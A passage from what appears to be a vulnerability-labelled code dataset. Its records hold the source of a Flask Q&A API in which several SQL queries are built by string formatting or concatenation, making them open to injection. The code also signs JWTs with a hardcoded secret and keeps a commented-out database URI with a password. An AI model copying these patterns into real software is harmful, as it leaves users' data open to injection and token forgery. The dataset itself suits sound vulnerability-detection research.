cur.execute(command)\n                    con.commit()\n                except Exception as e:\n                    print(e)\n        else:\n            print(\" * Database {} does not exists\".format(self.database))\n        con.close()\n\n\ndb = Database(BaseConfig.DATABASE_URI)\n/n/n/napp/postman/document.py/n/nimport json\nfrom urllib.parse import urlparse\n\n\nclass ApiDocumentGen:\n    def __init__(self, file):\n        self.file = file\n        self.data = {}\n        self.name = ''\n        self.description = ''\n        self.domain = ''\n        self.api_version = '/api/v1'\n        self.output_file = 'apiary.apid'\n        self.file_format = 'FORMAT: 1A'\n        self.requests = []\n        self.get_data()\n        self.data_out()\n\n    def get_data(self):\n        with open(self.file, encoding='utf-8') as f:\n            self.data = json.loads(f.read())\n        self.name = self.data['name']\n        self.description = self.data['description']\n        self.get_url_info()\n\n    def data_out(self):\n        # write document introduction\n        doc = open(self.output_file, 'w+')\n        doc.write(self.file_format + '\\n')\n        doc.write('HOST: ' + self.domain + '\\n\\n')\n        doc.write('# ' + self.name + '\\n\\n')\n        doc.write(self.description)\n        doc.close()\n\n        for request in self.data.get('requests'):\n            self.process_requests(request)\n\n    def process_requests(self, request):\n        url = urlparse(request.get('url'))\n        path = url.path.replace(self.api_version, '')\n        self.domain, description = url, request.get('description')\n        method, name = request.get('method'), request.get('name')\n        content_type = 'application/json'\n        collection_name = '## ' + name + ' [' + path + ']\\n'\n        title = '### ' + name + ' [' + method + ']'\n        req = '+ Request (' + content_type + ')'\n        resp = '+ Response 201 (' + content_type + ')'\n\n        doc = open(self.output_file, 'a')\n        doc.write(collection_name + '\\n\\n')\n        doc.write(title + '\\n')\n        doc.write(description + '\\n\\n')\n        if method == \"POST\":\n            doc.write(req + '\\n\\n')\n            json_data = json.loads(request.get('rawModeData'))\n            json.dump(json_data, doc, indent=8, sort_keys=True, ensure_ascii=False)\n            doc.write('\\n\\n\\n')\n\n        doc.write(resp + '\\n\\n\\n')\n        doc.close()\n\n    def get_url_info(self):\n        url = self.data.get('requests')[0].get('url')\n        domain = urlparse(url)\n        self.domain = url.replace(domain.path, '') + self.api_version\n\n\nif __name__ == \"__main__\":\n    app = ApiDocumentGen('data.json')\n    # app.main()\n\n/n/n/napp/questions/api/v1/view.py/n/n# APIs Resources\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom flask import Blueprint, request, make_response, jsonify, session\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\nquestion_blueprint = Blueprint('questions', __name__)\n\n\nclass CreateAPIView(MethodView):\n    \"\"\"\n    Create API Resource\n    \"\"\"\n    @jwt_required\n    def post(self):\n        # get the post data\n        data = request.get_json(force=True)\n        data['user_id'] = session.get('user_id')\n        row = Table(data).save()\n        if row:\n            response_object = {\n                'status': 'success',\n                'results': row\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Some error occurred. Please try again.'\n        }\n        return make_response(jsonify(response_object)), 401\n\n    \"\"\" UPDATE QUESTION \"\"\"\n    @jwt_required\n    def put(self, question_id=None):\n        # get the post data\n        data = request.get_json(force=True)\n        data['question_id'] = question_id\n        data['user_id'] = session.get('user_id')\n        result = Table(data).update()\n        if result:\n            response_object = {\n                'status': 'success',\n                'results': data\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Some error occurred. Please try again.'\n        }\n        return make_response(jsonify(response_object)), 401\n\n    \"\"\" DELETE QUESTION \"\"\"\n    @jwt_required\n    def delete(self, question_id=None):\n        data = dict()\n        data['user_id'], data['question_id'] = session.get('user_id'), question_id\n        response = Table(data).delete()\n        if response == 401:\n            response_object = {\n                'status': 'fail',\n                'message': 'Unauthorized, You cannot delete this question!.'\n            }\n            return make_response(jsonify(response_object)), 401\n        if response == 404:\n            response_object = {'status': 'fail', 'message': 'Some error occurred. Question Not Found!.'}\n            return make_response(jsonify(response_object)), 404\n        if not response:\n            response_object = {\n                'status': 'fail',\n                'message': 'Some error occurred. Please try again.'\n            }\n            return make_response(jsonify(response_object)), 400\n        response_object = {\n            'status': 'success',\n            'message': 'Question deleted successfully'\n        }\n        return make_response(jsonify(response_object)), 200\n\n\nclass ListAPIView(MethodView):\n    \"\"\" List API Resource \"\"\"\n    @jwt_required\n    def get(self, instance_id=None, user_id=None):\n        data = dict()\n        data['question_id'], data['user_id'] = instance_id, session.get('user_id')\n        if user_id:\n            results = Table({}).filter_by_user()\n            if results:\n                response_object = {'results': results, 'status': 'success'}\n                return make_response(jsonify(response_object)), 200\n        if instance_id:\n            results = Table(data).filter_by()\n            if not results:\n                response_object = {'status': 'fail', 'message': 'Bad request.'}\n                return make_response(jsonify(response_object)), 400\n            if len(results) < 1:\n                response_object = {'results': 'Question not found', 'status': 'error'}\n                return make_response(jsonify(response_object)), 404\n            response_object = {'results': results, 'status': 'success'}\n            return make_response(jsonify(response_object)), 200\n        response_object = {\n            'results': Table({'q': request.args.get('q')}).query(), 'status': 'success'\n        }\n        return (jsonify(response_object)), 200\n\n\nclass UserQuestionsListAPIView(MethodView):\n    \"\"\"\n    List API Resource\n    \"\"\"\n    @jwt_required\n    def get(self, user):\n        data = {'user_id': session.get('user_id')}\n        results = Table(data).filter_by_user()\n        if results:\n            response_object = {'results': results, 'status': 'success'}\n            return (jsonify(response_object)), 200\n\n        response_object = {'results': 'Bad Request'}\n        return (jsonify(response_object)), 400\n\n\n# Define the API resources\ncreate_view = CreateAPIView.as_view('create_api')\nlist_view = ListAPIView.as_view('list_api')\nuser_questions_list_view = ListAPIView.as_view('user_questions_api')\n\n# Add Rules for API Endpoints\nquestion_blueprint.add_url_rule(\n    '/api/v1/questions/',\n    view_func=create_view,\n    methods=['POST']\n)\n\nquestion_blueprint.add_url_rule(\n    '/api/v1/questions/<string:question_id>',\n    view_func=create_view,\n    methods=['DELETE']\n)\n\nquestion_blueprint.add_url_rule(\n    '/api/v1/questions/<string:question_id>',\n    view_func=create_view,\n    methods=['PUT']\n)\n\nquestion_blueprint.add_url_rule(\n    '/api/v1/questions/',\n    view_func=list_view,\n    methods=['GET']\n)\n\nquestion_blueprint.add_url_rule(\n    '/api/v1/questions/user/<string:user_id>',\n    view_func=user_questions_list_view,\n    methods=['GET']\n)\n\nquestion_blueprint.add_url_rule(\n    '/api/v1/questions/<string:instance_id>',\n    view_func=list_view,\n    methods=['GET']\n)\n/n/n/napp/questions/models.py/n/n# Custom Model\n\n# Author: P8ul\n# https://github.com/p8ul\n\n\"\"\"\n    This class will connect to a Database and perform crud actions\n    Has relevant getters, setters & mutation methods\n\"\"\"\nimport psycopg2\nimport psycopg2.extensions\nfrom psycopg2.extras import RealDictCursor\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Table:\n    def __init__(self, data={}):\n        self.config = db_config(BaseConfig.DATABASE_URI)\n        self.table, self.title = 'questions', data.get('title')\n        self.body, self.q = data.get('body'), data.get('q')\n        self.question_id = data.get('question_id')\n        self.user_id = data.get('user_id')\n\n    def save(self):\n        \"\"\" Create a question record in questions table\n        :return: None or record values\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur, response = con.cursor(cursor_factory=RealDictCursor), None\n        try:\n            query = \"INSERT INTO questions (title, body, user_id) VALUES (%s, %s, %s) RETURNING *\"\n            cur.execute(query, (self.title, self.body, self.user_id))\n            con.commit()\n            response = cur.fetchone()\n        except Exception as e:\n            print(e)\n        con.close()\n        return response\n\n    def query(self):\n        \"\"\"Query the data in question table :return: list: query set list\"\"\"\n        con, queryset_list = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            if not self.q:\n                cur.execute(\n                    \" SELECT *,( SELECT count(*) FROM \"\n                    \"answers WHERE answers.question_id=questions.question_id ) as \"\n                    \"answers_count FROM questions \"\n                    \" ORDER BY questions.created_at DESC\"\n                )\n            else:\n                query = \"SELECT *, ( SELECT count(*) FROM answers WHERE \"\n                query += \" answers.question_id=questions.question_id ) as answers_count \"\n                query += \" FROM questions WHERE  body LIKE %s OR title LIKE %s  \"\n                query += \" ORDER BY questions.created_at\"\n                cur.execute(query, (self.q, self.q))\n            queryset_list = cur.fetchall()\n        except Exception as e:\n            print(e)\n        con.close()\n        return queryset_list\n\n    def filter_by(self):\n        \"\"\"\n        Selects a question by id\n        :return: False if record is not found else query list of found record\n        \"\"\"\n        con, queryset_list = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        cur2 = con.cursor(cursor_factory=RealDictCursor)\n        try:\n\n            query = \"\"\" SELECT * FROM questions WHERE questions.question_id=%s ORDER BY questions.created_at\"\"\"\n            cur.execute(query % self.question_id)\n            questions_queryset_list = cur.fetchall()\n            cur2.execute(\"SELECT * FROM answers WHERE answers.question_id=%s\" % self.question_id)\n            answers_queryset_list = cur2.fetchall()\n            queryset_list = {\n                'question': questions_queryset_list,\n                'answers': answers_queryset_list\n            }\n        except Exception as e:\n            print(e)\n        con.close()\n        return queryset_list\n\n    def filter_by_user(self):\n        \"\"\"\n        Selects question for specific user:default filters by current logged in user\n        :return: False if record is not found else query list of found record\n        \"\"\"\n        con, queryset_list = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            cur.execute(\n                \"\"\" SELECT * FROM questions \n                    WHERE questions.user_id=\"\"\" + self.user_id + \"\"\" ORDER BY questions.created_at \"\"\"\n            )\n            questions_queryset_list = cur.fetchall()\n            queryset_list = {'question': questions_queryset_list}\n        except Exception as e:\n            print(e)\n        con.close()\n        return queryset_list\n\n    def update(self):\n        \"\"\"\n        Update an question column\n        :return: bool:\n        \"\"\"\n        con, result = psycopg2.connect(**self.config), True\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"UPDATE questions SET title=%s, body=%s WHERE question_id=%s\"\n            cur.execute(query, (self.title, self.body, self.question_id))\n            con.commit()\n        except Exception as e:\n            print(e)\n            result = False\n        con.close()\n        return result\n\n    def record_exists(self):\n        \"\"\"\n        checks whether a question was asked by the user\n        :return: bool: False if record is not found else True\n        \"\"\"\n        con, exists = psycopg2.connect(**self.config), False\n        cur, queryset_list = con.cursor(cursor_factory=RealDictCursor), None\n        try:\n            query = \"SELECT question_id, user_id FROM questions WHERE question_id=%s AND user_id=%s\"\n            cur.execute(query, (self.question_id, self.user_id))\n            queryset_list = cur.fetchall()\n            con.close()\n            exists = True if len(queryset_list) > 1 else False\n        except Exception as e:\n            print(e)\n        return exists\n\n    def delete(self):\n        \"\"\" Delete a table records\n        :return: bool\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            exist = self.filter_by()['question']\n            if not len(exist) > 0:\n                return 404\n            if not self.record_exists():\n                return 401\n            cur.execute(\"DELETE from {} WHERE {}= '{}'\".format(self.table, 'question_id', self.question_id))\n            con.commit()\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n        con.close()\n        return True\n/n/n/napp/questions/test/test_question_model.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\nfrom ..models import Table\n\ntable = Table()\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test question model  \"\"\"\n    def test_question_model(self):\n        query = table.query()\n        self.assertIsInstance(query, type([]))\n\n    def test_model_filter(self):\n        query = table.filter_by()\n        self.assertEqual(query, None)\n\n    def test_model_filter_user(self):\n        query = table.filter_by_user()\n        self.assertEqual(query, None)\n\n    def test_model_save(self):\n        query = table.save()\n        self.assertEqual(query, None)\n\n    def test_model_update(self):\n        query = table.update()\n        self.assertEqual(query, True)\n\n    def test_model_delete(self):\n        query = table.delete()\n        self.assertEqual(query, False)\n\n    def test_model_init(self):\n        keys = table.config.keys()\n        self.assertIn(list(keys)[0], ['password', 'user', 'database', 'host'])\n        self.assertEqual(len(list(keys)), 4)\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/questions/test/test_questions_apis.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test List questions api \"\"\"\n    def test_list_questions(self):\n        response = self.client.get(\n            '/api/v1/questions/',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        assert response.status_code == 200\n        assert response.get_json()['status'] == 'success'\n\n    \"\"\" Test retrieve questions api \"\"\"\n    def test_retrieve_question(self):\n        response = self.client.get(\n            '/api/v1/questions/1',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.get_json()['status'], 'success')\n\n    \"\"\" Test retrieve questions api \"\"\"\n    def test_post_update(self):\n        \"\"\" Initialize test data \"\"\"\n        data = {\n            'title': 'Test title',\n            'body': 'Test body',\n            'user': self.user_id\n        }\n\n        \"\"\" Post request\"\"\"\n        response = self.client.post(\n            '/api/v1/questions/', json=data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n\n        \"\"\" Test status \"\"\"\n        self.assertEqual(response.status_code, 201)\n\n        \"\"\" Test if a question is created \"\"\"\n        self.assertEqual(response.get_json()['status'], 'success')\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/test/base.py/n/nimport unittest\n\nfrom .. import create_app\napp = create_app(\"config.TestConfig\")\n\n\nclass BaseTestCase(unittest.TestCase):\n    \"\"\"A base test case.\"\"\"\n\n    def create_app(self):\n        app.config.from_object('config.TestConfig')\n        return app\n\n    def setUp(self):\n        # method to invoke before each test.\n        self.client = app.test_client()\n        self.data = {\n            'username': 'Paul',\n            'email': 'pkinuthia10@gmail.com',\n            'password': 'password'\n        }\n        \"\"\" Login to get a JWT token \"\"\"\n        self.client.post('/api/v1/auth/signup', json=self.data)\n        response = self.client.post('/api/v1/auth/login', json=self.data)\n        self.token = response.get_json().get('auth_token')\n        self.user_id = str(response.get_json()['id'])\n\n    def tearDown(self):\n        # method to invoke after each test.\n        pass\n/n/n/napp/utils.py/n/nfrom urllib.parse import urlparse\nimport datetime\nimport os\nimport re\nfrom functools import wraps\nfrom flask import request, make_response, jsonify, session\nimport jwt\n\n\ndef jwt_required(f):\n    \"\"\" Ensure jwt token is provided and valid\n        :param f: function to decorated\n        :return: decorated function\n    \"\"\"\n    @wraps(f)\n    def decorated_function(*args, **kwargs):\n        try:\n            auth_header = request.headers.get('Authorization').split(' ')[-1]\n        except Exception as e:\n            print(e)\n            return make_response(jsonify({\"message\": 'Unauthorized. Please login'})), 401\n        result = decode_auth_token(auth_header)\n        try:\n            if int(result):\n                pass\n        except Exception as e:\n            print(e)\n            return make_response(jsonify({\"message\": result})), 401\n        return f(*args, **kwargs)\n    return decorated_function\n\n\ndef encode_auth_token(user_id):\n    \"\"\"\n    Encodes a payload to generate JWT Token\n    :param user_id: Logged in user Id\n    :return: JWT token\n    :TODO add secret key to app configuration\n    \"\"\"\n    payload = {\n        'exp': datetime.datetime.utcnow() + datetime.timedelta(days=31, seconds=30),\n        'iat': datetime.datetime.utcnow(),\n        'sub': user_id\n    }\n    return jwt.encode(\n        payload,\n        'SECRET_KEY',\n        algorithm='HS256'\n    )\n\n\ndef decode_auth_token(auth_token):\n    \"\"\" Validates the auth token\n    :param auth_token:\n    :return: integer|string\n    \"\"\"\n    try:\n        payload = jwt.decode(auth_token, 'SECRET_KEY', algorithm='HS256')\n        session['user_id'] = str(payload.get('sub'))\n        return payload['sub']\n    except jwt.ExpiredSignatureError:\n        return 'Token Signature expired. Please log in again.'\n    except jwt.InvalidTokenError:\n        return 'Invalid token. Please log in again.'\n\n\ndef db_config(database_uri):\n    \"\"\" This function extracts postgres url\n    and return database login information\n    :param database_uri: database Configuration uri\n    :return: database login information\n    \"\"\"\n    if os.environ.get('DATABASE_URI'):\n        database_uri = os.environ.get('DATABASE_URI')\n\n    result = urlparse(database_uri)\n    config = {\n        'database': result.path[1:],\n        'user': result.username,\n        'password': result.password,\n        'host': result.hostname\n    }\n    return config\n\n\ndef valid_email(email):\n    \"\"\"  Validate email \"\"\"\n    return re.match(r'^.+@([?)[a-zA-Z0-9-.])+.([a-zA-Z]{2,3}|[0-9]{1,3})(]?)$', email)\n/n/n/napp/votes/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify, session\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\nvotes_blueprint = Blueprint('votes', __name__)\n\n\nclass VoteAPIView(MethodView):\n    \"\"\" Update Instance api resource \"\"\"\n\n    @jwt_required\n    def post(self, answer_id=None):\n        data = request.get_json(force=True)\n        data['answer_id'] = answer_id\n        data['user_id'] = session.get('user_id')\n        response = Table(data).vote()\n        if response:\n            response_object = {\n                'status': 'success',\n                'message': 'Your vote was successful'\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Some error occurred. Please try again.'\n        }\n        return make_response(jsonify(response_object)), 400\n\n\n# Define the API resources\nvote_view = VoteAPIView.as_view('vote_api')\n\n# Add Rules for API Endpoints\nvotes_blueprint.add_url_rule(\n    '/api/v1/questions/answers/vote/<string:answer_id>',\n    view_func=vote_view,\n    methods=['POST']\n)\n/n/n/napp/votes/models.py/n/n\"\"\"\n    Author: P8ul\n    https://github.com/p8ul\n\n    This class will connect to a Database and perform crud actions\n    Has relevant getters, setters & mutation methods\n\"\"\"\nimport psycopg2\nimport psycopg2.extensions\nfrom psycopg2.extras import RealDictCursor\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Table:\n    def __init__(self, data={}):\n        self.config = db_config(BaseConfig.DATABASE_URI)\n        self.table, self.answer_id = 'votes', data.get('answer_id')\n        self.vote_value, self.user_id = data.get('vote'), data.get('user_id')\n\n    def vote_exists(self):\n        \"\"\"\n        Checks if vote for a particular answer\n        is voted by current user\n        :return: True if vote exist else False\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"SELECT user_id, vote_id FROM votes WHERE answer_id=%s AND user_id=%s\"\n            cur.execute(query, (self.answer_id, self.user_id))\n            queryset_list = cur.fetchall()\n            con.close()\n            if len(queryset_list) < 1:\n                return False\n            return True\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n\n    def create_vote(self):\n        \"\"\"\n        Insert a vote in votes table\n        :return: True if record values are inserted successfully else false\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"INSERT INTO votes(user_id, answer_id, vote) VALUES(%s, %s, %s)\"\n            cur.execute(query, (self.user_id, self.answer_id, self.vote_value))\n            con.commit()\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n        return True\n\n    def update_vote(self):\n        \"\"\"\n        Modify record from votes table\n        :return:\n        \"\"\"\n        if not self.answer_id:\n            return False\n        try:\n            con = psycopg2.connect(**self.config)\n            cur = con.cursor(cursor_factory=RealDictCursor)\n            query = \"UPDATE votes SET vote=%s WHERE answer_id=%s AND user_id=%s\"\n            cur.execute(query, (self.vote_value, self.answer_id, self.user_id))\n            con.commit()\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n        return True\n\n    def vote(self):\n        \"\"\"\n        Switch bus for updating or creating a vote\n        :return: bool: True if transaction is\n                       completed successfully else false\n        \"\"\"\n        if self.vote_exists():\n            return self.update_vote()\n        return self.create_vote()\n\n    def delete(self):\n        pass\n\n    def save(self):\n        pass\n/n/n/napp/votes/test/__init__.py/n/n/n/n/napp/votes/test/test_vote_apis.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test List votes api \"\"\"\n    def test_votes_api(self):\n        response = self.client.post(\n            '/api/v1/questions/answers/vote/1', data=self.data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        assert response.status_code == 400\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/votes/test/test_vote_model.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\nfrom ..models import Table\n\ntable = Table()\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test votes model  \"\"\"\n    def test_model_save(self):\n        query = table.save()\n        self.assertEqual(query, None)\n\n    def test_model_delete(self):\n        query = table.delete()\n        self.assertEqual(query, None)\n\n    def test_model_vote_exist(self):\n        query = table.vote_exists()\n        self.assertEqual(query, None)\n\n    def test_model_vote_exist(self):\n        query = table.vote()\n        self.assertEqual(query, False)\n\n    def test_model_update_vote(self):\n        query = table.update_vote()\n        self.assertEqual(query, False)\n\n    def test_model_create_vote(self):\n        query = table.create_vote()\n        self.assertEqual(query, False)\n\n    def test_model_init(self):\n        keys = table.config.keys()\n        self.assertIn(list(keys)[0], ['password', 'user', 'database', 'host'])\n        self.assertEqual(len(list(keys)), 4)\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/nconfig.py/n/n### Configuration file\n\n# Author: P8ul Kinuthia\n# https://github.com/p8ul\n\nimport os\n\n\n# default config\nclass BaseConfig(object):\n    basedir = os.path.abspath(os.path.dirname(__file__))\n    # DATABASE_URI = \"postgres://tvhuxucdtigrin:fc7e1f53efe5f81b6a6d3dacad8f79605cd0973d0ae5efa5ac29b3976b48f938@ec2-54-83-13-119.compute-1.amazonaws.com:5432/d393cevo034f77\"\n    DATABASE_URI = \"postgresql://stack:stack@127.0.0.1:5432/stack\"\n    DEBUG = True\n    SECRET_KEY = '\\xbf\\xb0\\x11\\xb1\\xcd\\xf9\\xba\\x8bp\\x0c...'\n\n\nclass TestConfig(BaseConfig):\n    DEBUG = True\n    TESTING = True\n    WTF_CSRF_ENABLED = False\n    DATABASE_URI = 'sqlite:///:memory:'\n\n\nclass DevelopmentConfig(BaseConfig):\n    DEBUG = True\n\n\nclass ProductionConfig(BaseConfig):\n    DEBUG = True/n/n/nmanage.py/n/n# Flask app\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom app import create_app\napp = create_app(\"config.BaseConfig\")\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "ad02c932f85c0f4ed6c1e561efc5edc163347806", "code": "/app/__init__.py/n/n# Flask create app\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom flask import Flask\nfrom .migrations.db import db\n\n\ndef create_app(config_filename):\n    app = Flask(__name__)\n    app.config.from_object(config_filename)\n\n    with app.app_context():\n        pass\n\n    \"\"\" Basic Routes \"\"\"\n\n    # register our blueprints\n    configure_blueprints(app)\n\n    # register extensions\n    configure_extensions()\n\n    return app\n\n\ndef configure_blueprints(app):\n    \"\"\"Configure blueprints .\"\"\"\n    from app.questions.api.v1.view import question_blueprint\n    from .home.views import home_blueprint\n    from .auth.api.v1.view import auth_blueprint\n    from .answers.api.v1.view import answers_blueprint\n    from .votes.api.v1.view import votes_blueprint\n    from .comments.api.v1.view import comments_blueprint\n\n    app_blueprints = [\n        answers_blueprint,\n        question_blueprint,\n        auth_blueprint,\n        votes_blueprint,\n        comments_blueprint,\n        home_blueprint\n    ]\n\n    for bp in app_blueprints:\n        app.register_blueprint(bp)\n\n\ndef configure_extensions():\n    db.test()\n\n\nif __name__ == \"__main__\":\n    app = create_app(\"config\")\n    app.run(debug=True)\n/n/n/n/app/answers/api/v1/view.py/n/n# APIs Resources\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom flask import Blueprint, request, make_response, jsonify\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\nanswers_blueprint = Blueprint('answers', __name__)\n\n\nclass CreateAPIView(MethodView):\n    \"\"\" Update Instance api resource \"\"\"\n\n    @jwt_required\n    def put(self, question_id=None, answer_id=None):\n        data = request.get_json(force=True)\n        response = Table.update(question_id, answer_id, data)\n        if response == 200:\n            response_object = {\n                'status': 'success',\n                'message': 'Update successful'\n            }\n            return make_response(jsonify(response_object)), 200\n        if response == 302:\n            response_object = {\n                'status': 'fail',\n                'message': 'Please provide correct answer and question id'\n            }\n            return make_response(jsonify(response_object)), 400\n        if response == 203:\n            response_object = {\n                'status': 'fail',\n                'message': 'Unauthorized request.'\n            }\n            return make_response(jsonify(response_object)), 401\n\n        else:\n            response_object = {\n                'status': 'fail',\n                'message': 'Please provide correct answer and question id'\n            }\n            return make_response(jsonify(response_object)), 400\n\n\n    \"\"\"\n    Create API Resource\n    \"\"\"\n    @jwt_required\n    def post(self, question_id=None):\n        # get the post data\n        post_data = request.get_json(force=True)\n        response = Table.save(str(question_id), data=post_data)\n        if response:\n            response_object = {\n                'status': 'success',\n                'message': response\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Unknown question id. Try a different id.'\n        }\n        return make_response(jsonify(response_object)), 400\n\n\nclass ListAPIView(MethodView):\n    \"\"\"\n    List API Resource\n    \"\"\"\n    @jwt_required\n    def get(self, instance_id=None, user_id=None):\n        if instance_id:\n            query = {\n                'instance_id': instance_id,\n                'user_id': user_id\n            }\n            results = Table.filter_by(**query)\n            if len(results) < 1:\n                response_object = {\n                    'results': 'Instance not found',\n                    'status': 'error'\n                }\n                return make_response(jsonify(response_object)), 404\n            response_object = {\n                'results': results,\n                'status': 'success'\n            }\n            return (jsonify(response_object)), 200\n\n        response_object = {\n            'results': Table.query(),\n            'status': 'success'\n        }\n        return (jsonify(response_object)), 200\n\n\n# Define the API resources\ncreate_view = CreateAPIView.as_view('create_api')\nlist_view = ListAPIView.as_view('list_api')\n\n# Add Rules for API Endpoints\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/<int:question_id>/answers',\n    view_func=create_view,\n    methods=['POST']\n)\n\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/<string:question_id>/answers/<string:answer_id>',\n    view_func=create_view,\n    methods=['PUT']\n)\n\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/answers',\n    view_func=list_view,\n    methods=['GET']\n)\n/n/n/n/app/answers/test/base.py/n/nimport unittest\n\nfrom ... import create_app\napp = create_app(\"config.TestConfig\")\n\n\nclass BaseTestCase(unittest.TestCase):\n    \"\"\"A base test case.\"\"\"\n    def create_app(self):\n        app.config.from_object('config.TestConfig')\n        return app\n\n    def setUp(self):\n        # method to invoke before each test.\n        self.client = app.test_client()\n        self.data = {\n            'username': 'Paul',\n            'email': 'pkinuthia10@gmail.com',\n            'password': 'password'\n        }\n        \"\"\" Login to get a JWT token \"\"\"\n        self.client.post('/api/v1/auth/signup', json=self.data)\n        response = self.client.post('/api/v1/auth/login', json=self.data)\n        self.token = response.get_json().get('auth_token')\n        self.user_id = str(response.get_json()['id'])\n\n    def tearDown(self):\n        # method to invoke after each test.\n        pass\n/n/n/n/app/answers/test/test_basics.py/n/n# APIs Testing\n\n# Author: P8ul Kinuthia\n# https://github.com/p8ul\n\nimport unittest\nfrom .base import BaseTestCase\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test List answers api \"\"\"\n    def test_list_answers(self):\n        response = self.client.get(\n            '/api/v1/questions/answers',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.get_json()['status'], 'success')\n\n    \"\"\" Test answers CRUD api \"\"\"\n    def test_post_update(self):\n        \"\"\" Initialize test data \"\"\"\n        data = {\n            'title': 'Test title',\n            'body': 'Test body',\n            'answer_body': 'Test answer',\n            'user': self.user_id\n        }\n\n        \"\"\" Add test question\"\"\"\n        self.client.post(\n            '/api/v1/questions/', json=data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n\n        response = self.client.get(\n            '/api/v1/questions/',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        question_id = response.get_json().get('results')[0].get('question_id')\n\n        \"\"\" Test post answer \"\"\"\n        response = self.client.post(\n            '/api/v1/questions/'+str(question_id)+'/answers', json=data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n\n        \"\"\" Test status \"\"\"\n        self.assertEqual(response.status_code, 201)\n\n        \"\"\" Test if a question is created \"\"\"\n        self.assertEqual(response.get_json()['status'], 'success')\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/n/app/auth/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required, encode_auth_token\n\nauth_blueprint = Blueprint('auth', __name__)\n\n\nclass RegisterAPI(MethodView):\n    \"\"\"\n    User Signup API Resource\n    \"\"\"\n\n    def post(self):\n        # get the post data\n        post_data = request.get_json(force=True)\n        # check if user already exists\n        user = Table.filter_by(post_data.get('email'))\n        if not user:\n            try:\n                user = Table.save(data=post_data)\n                # generate the auth token\n                auth_token = encode_auth_token(user.get('id')).decode()\n                response_object = {\n                    'status': 'success',\n                    'message': 'Successfully registered.',\n                    'id': user.get('id'),\n                    'auth_token': auth_token\n                }\n                return make_response(jsonify(response_object)), 201\n            except Exception as e:\n                print(e)\n                response_object = {\n                    'status': 'fail',\n                    'message': 'Some error occurred. Please try again.'\n                }\n                return make_response(jsonify(response_object)), 401\n        else:\n            response_object = {\n                'status': 'fail',\n                'message': 'User already exists. Please Log in.',\n            }\n            return make_response(jsonify(response_object)), 202\n\n    def delete(self, user_id=None):\n        post_data = request.get_json(force=True)\n        Table.delete(user_id, post_data)\n        response_object = {\n            'status': 'success',\n            'message': 'User deleted successfully.',\n        }\n        return make_response(jsonify(response_object)), 200\n\n\nclass LoginAPI(MethodView):\n    \"\"\" User Login API Resource \"\"\"\n  